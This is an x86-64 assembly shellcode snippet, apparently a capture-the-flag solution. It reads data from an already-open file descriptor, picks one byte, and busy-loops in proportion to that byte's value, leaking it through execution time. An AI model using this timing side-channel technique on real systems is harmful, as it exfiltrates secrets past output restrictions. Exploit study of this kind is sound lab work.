.global _start
_start:
.intel_syntax noprefix

# read(4, buf, 0x80);
mov rax, 0
mov rdi, 4
lea rsi, [rip+buf]
mov rdx, 0x80
syscall

# Read the byte value at index x.
mov rbx, 0
mov bl, BYTE PTR [rip+buf+x]
sub rbx, 33

# Loop for this byte value.
# This loop uses rax and rbx.
mov rax, 0
jmp loop_start

loop_back:

# Inner Loop Start
mov rsi, 0
jmp one_sec_loop_start

one_sec_loop_back:
inc rsi

one_sec_loop_start:
mov rdi, 0x7A8000000
cmpq rsi, rdi
jl one_sec_loop_back
# Inner Loop End

inc rax

loop_start:
cmp rax, rbx
jl loop_back

buf:
.asciz "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
